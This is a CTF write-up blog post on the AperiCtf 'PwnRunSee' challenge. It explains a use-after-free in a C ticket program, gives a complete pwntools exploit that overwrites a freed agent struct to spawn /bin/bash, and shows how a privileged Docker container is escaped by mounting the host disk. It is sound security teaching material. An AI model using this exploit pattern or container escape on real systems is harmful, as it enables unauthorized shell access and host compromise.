---
title: "Pwn Run See (part 1 & 2)"
date: 2019-10-09T11:39:54+02:00
categories:
- write-ups
- aperi-ctf
tags:
- pwn
- UAF
- docker
keywords:
- pwn
- UAF
- docker
coverImage: /images/PwnRunSee/memory.png
coverSize: full
coverMeta: in
metaAlignment: center
autoThumbnailImage: false
summary : "Write-up about the two part of the challenge PwnRunSee from the AperiCtf"
---

|  Event | Challenge | Category | Points | Solves |
|:----------:|:------------:|:------------:|:------------:|:------------:|
| AperiCtf |  PwnRunSee 1  |  pwn  |  175 |  5  |
| AperiCtf |  PwnRunSee 2|  pwn  |  250 |  2  |

# TL;DR

This challenge was a use after free vulnerability which allow the user to get a shell on the remote docker after a call to execve with some user controlled parameters. Once inside the docker, we can abuse some privileges to mount the host disk inside the container and get the last flag. 

# Recon

The [program](/files/PwnRunSee/chall.c) allows the user to create some tickets which will then be processed by some users depending of the ticket destination. If the ticket destination isn't a valid one a "Intern" is hired to process the ticket then fired.

{{< image classes="fancybox fig-50" src="/images/PwnRunSee/choice1.png" thumbnail="/images/PwnRunSee/choice1.png" >}}
{{< image classes="fancybox fig-50" src="/images/PwnRunSee/choice3.png" thumbnail="/images/PwnRunSee/choice3.png" >}}
{{< image classes="fancybox fig-25" src="/images/PwnRunSee/choice2.png" thumbnail="/images/PwnRunSee/choice2.png" >}}
{{< image classes="fancybox clear fig-25" src="/images/PwnRunSee/choice4.png" thumbnail="/images/PwnRunSee/choice4.png" >}}

</br>

Agents are stored in a linked list, each agent has a pointer to the next agent and to the previous agent. If there is no previous/next agent it points to NULL. By default, there are 2 agents, the founder and Moss.


{{< codeblock lang="c"  >}}
typedef struct Agent_t {
    char name[12];  // the name of the agent
    char service[4];  // the service to which the agent belongs (basically ADM/USR)
    void (*run_task)();
    char task[12];  // what the agent is able to do?
    int ticket_count;  // how many tickets this agent has processed?
    struct Agent_t *predecessor;  // which agent has joined the company before him?
    struct Agent_t *successor;  // which agent has joined the company after him?
} Agent_t;
{{< /codeblock >}}

After looking at the code we can spot a vulnerability, in the {{< hl-text orange >}}fire_interns{{< /hl-text >}} function the intern is freed, but the linked list is not updated so the successor of the previous agent (Moss if it's the first intern) will point to a free memory area. When an object is freed, the object itself is not destroyed and the content of the object remain intact.

{{< codeblock lang="c"  >}}
// Interns aren't really useful isn't it?
void fire_interns() {
    Agent_t *agent = NULL;
    Agent_t *next = NULL;

    agent = founder;
    while (agent != NULL) {
        printf("Looking %s for firing\n", agent->name);
        next = agent->successor;
        // TODO: update linked list.
        if (strcmp(agent->name, "Intern") == 0) {
            printf("%s has been fired\n", agent->name);
            //Here agent freed but list not updated !!
            free(agent);
        }
        agent = next;
    }
}
{{< /codeblock >}}

So now when we create a new ticket, it will point to the same memory area than the previous freed agent. Here is an example, first you create a useless ticket, then you ask the agents to process the ticket in order to create the Intern agent. Now there are no tickets left and the intern agent is freed. Here is what happen if you create another ticket and display the agent list : 

{{< image classes="fancybox fig-50" src="/images/PwnRunSee/overflow1.png" thumbnail="/images/PwnRunSee/overflow1.png" >}}
{{< image classes="fancybox fig-50" src="/images/PwnRunSee/overflow2.png" thumbnail="/images/PwnRunSee/overflow2.png" >}}

We can control the content of the agent ! It's time for exploitation.

# Building the exploit

Here is the representation of the memory. The red arrows show the memory when the intern has been hired. The purple arrow show the memory when the intern has been freed and when a new ticket is created. The successor pointer of Moss will point to the created ticket and it will be interpreted as an agent. Thanks to that we can control the structure of the agent and put what we want inside. 

{{< image classes=" clear fig-100" src="/images/PwnRunSee/memory.png" thumbnail="/images/PwnRunSee/memory.png" >}}

Now we need to create this special ticket in order to change the intern's parameters and get him execute a shell on the remote docker. What we want to achieve is a call to {{< hl-text orange >}}execve{{< /hl-text >}} in the {{< hl-text orange >}}run_task{{< /hl-text >}}function.




{{< codeblock lang="c"  >}}
void run_task(Agent_t *agent, Ticket_t *ticket) {
    if (strcmp(agent->service, "ADM") == 0) {
        if (strcmp(agent->name, "Moss") == 0 || agent->ticket_count < 1) {  // don't accept commands if it's its first ticket!
            printf("Sorry %s, but you're really dangerous... I'm calling the 01189998819991197253!\n", agent->name);
        } else {
            printf("%s agent is processing the task...\n", agent->name);

            char *argv[] = {agent->task, ticket->description, NULL};
            //could be nice to call it with /bin/sh ? :D
            execve(agent->task, argv, NULL);
        }
    } else {
        printf("%s agent isn't admin!\n", agent->name);
    }
}
{{< /codeblock >}}

The run_task function is called from {{< hl-text orange >}}process_tickets{{< /hl-text >}}. It loops over all the tickets and look for a valid agent. When the agent has processed the ticket his ticket counter is increased by one. 

{{< codeblock lang="c"  >}}
[...]
agent = find_agent(ticket->to);
if (agent == NULL) {
    [...]
} else {
    [...]
    agent->run_task(agent, ticket);
    agent->ticket_count += 1;
}
{{< /codeblock >}}

But, how the agents are selected in {{< hl-text orange >}}find_agent{{< /hl-text >}} ? Here is the code responsible for that, first it compares the service of the agent and then check that the ticket count of the agent is lower than MAX_AGENT_TICKET (which is 4 here). 

{{< codeblock lang="c"  >}}
agent = founder;
    while (agent != NULL && found_agent == NULL) {
        if (strcmp(agent->service, service) == 0 && agent->ticket_count < MAX_AGENT_TICKET) {
            found_agent = agent;
        } else {
            agent = agent->successor;
        }
    }
{{< /codeblock >}}

So if we just craft the intern with service {{< hl-text orange >}}ADM{{< /hl-text >}} it won't work because Moss will be selected since it takes the agent list from the beginning to the end (Intern is the last one). We need to make Moss busy. The ticket count of Moss need to be bigger than MAX_AGENT_TICKET so he can't process other tickets, this will make find_agent return the intern. 

Before getting access to execve in run_task, some conditions are needed. The agent has to be an admin, the agent can't be Moss and the ticket count should be greater than 1:

{{< codeblock lang="c"  >}}
[...]
if (strcmp(agent->service, "ADM") == 0) {
    if (strcmp(agent->name, "Moss") == 0 || agent->ticket_count < 1) {  
        // don't accept commands if it's its first ticket!
[...]
{{< /codeblock >}}


So the idea of the exploit is :

- Create fake ticket for Moss to make him busy
- Create fake ticket for the intern in order to create him
- Process tickets
- Create special ticket to overwrite intern's params
- Create the shell ticket
- Process the tickets and enjoy your shell ! 

After overwriting the intern's params we will end up executing this command :

{{< codeblock lang="c" >}}
char *argv[] = {"/bin/bash", "-p", NULL};
            execve("/bin/bash", argv, NULL);
{{< /codeblock >}}

{{< image classes="clear center fig-100" src="/images/PwnRunSee/params.png" thumbnail="/images/PwnRunSee/params.png" >}}

# Exploit

{{< codeblock lang="python"  >}}
from pwn import *

#Static address in the binary
#Found by looking at other agents
run_task = 0x804871b
binary = "chall"

#HOST = "pwn-run-see.aperictf.fr"
HOST = "localhost"
PORT = 31337

#Create a ticket
def createTicket(name, dest, descrip, p):
	p.recvuntil("name: ")
	p.sendline(name)
	p.recvuntil("service: ")
	p.sendline(dest)
	p.recvuntil("ion: ")
	p.sendline(descrip)
	p.recvuntil("=> ")

p = remote(HOST, PORT)

#Make Moss Busy to make is ticket count > MAX_AGENT_TICKET
#so he can't process other tickets
for i in range(0, 5):
    p.sendline("3")
    createTicket("AAAA", "ADM", "AAAA", p)

#Process tickets and free Intern
p.sendline("4")
p.recvuntil("=> ")
p.sendline("3")

#Create the Special ticket with /bin/bash to change intern's params
createTicket("AAAA", "ADM", p32(run_task)+"/bin/bash", p)
p.sendline("3")

#Create the ticket to trigger the execve 
createTicket("AAAA", "ADM", "-p", p)
p.sendline("4")
p.interactive()
print p.recvuntil("=> ")
{{< /codeblock >}}


{{< image classes="clear center fig-100" src="/images/PwnRunSee/shell.png" thumbnail="/images/PwnRunSee/shell.png" thumbnail-width="80%" thumbnail-height="80%" >}}

# Part 2

{{< image classes=" center clear fig-100" src="/images/PwnRunSee/part2.png" thumbnail="/images/PwnRunSee/part2.png" thumbnail-width="50%" thumbnail-height="50%" >}}

So we end up part 1 with a shell, but we need to escape from the container. I'm not an expert in docker, but we can quickly spot the {{< hl-text orange >}}privileged: true{{< /hl-text >}} in the dockercompose.yml which sound promising !


{{< codeblock lang="json"  >}}
#
# Pwn, run, see.
#
# Written by:
#   Baptiste MOINE <contact@bmoine.fr>
#
version: '3'
networks:
    front:
        driver: bridge
services:
    xinetd:
        build: build/xinetd
        image: creased/xinetd:latest
        container_name: ${COMPOSE_PROJECT_NAME:-chall}
        hostname: ${COMPOSE_PROJECT_NAME:-chall}
        ports:
            - 31337:31337/tcp
        networks:
            front:
            #    ipv4_address: 10.0.0.1
        restart: always
        volumes:
            - ${ROOT:-.}/data/chall/chall:/data/chall:ro
            - ${ROOT:-.}/data/chall/flag:/data/flag:ro
            - ${ROOT:-.}/conf/xinetd/ctf.xinetd:/etc/xinetd.d/ctf:ro
            - ${ROOT:-.}/conf/xinetd/xinetd.conf:/etc/xinetd.conf:ro
        privileged: true
        healthcheck:
            test: ["CMD", "nc", "-z", "localhost", "31337"]
            interval: 10s
            timeout: 10s
            retries: 3
{{< /codeblock >}}

After some research on duckduckgo I discovered some warning about using this option. From the official docker website :

{{< pullquote >}}
When the operator executes docker run --privileged, Docker will enable access to all devices on the host as well as set some configuration in AppArmor or SELinux to allow the container nearly all the same access to the host as processes running outside containers on the host. 
{{< /pullquote >}}

Indeed we can access all the devices, to see them just use ```ls /dev```. In the device, there is {{< hl-text orange >}}/dev/sda1{{< /hl-text >}} which is the host partition !! To access this partition and escape the container we just need to mount it:


{{< codeblock lang="bash"  >}}
mkdir /mountDir
mount /dev/sda1 /mountDir
ls /mountDir/
{{< /codeblock >}}


{{< image classes=" center clear fig-100" src="/images/PwnRunSee/last2.png" >}}

I'm currently using a Mac, with mac and windows systems the docker daemon run in a VM so we can't really see the host partition, but on a linux machine we would have had access to the whole partition ! 

{{< image classes=" center clear fig-100" src="/images/PwnRunSee/end.gif" >}}
